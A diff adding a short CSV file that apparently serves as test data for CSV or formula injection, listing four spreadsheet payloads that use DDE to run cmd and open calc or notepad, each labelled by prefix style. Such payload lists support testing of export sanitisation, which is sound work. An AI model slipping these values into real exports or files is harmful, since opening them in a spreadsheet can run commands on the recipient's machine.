@@ -1,0 +1,5 @@
+id,formula_payload,comment
+1,"=cmd|' /C calc'!A0","DDE exec"
+2,"@SUM(1+1)*cmd|' /C calc'!A0","At formula exec"
+3,"-2+3+cmd|' /C calc'!A0","Minus formula exec"
+4,"+cmd|' /C notepad'!A0","Plus formula exec"
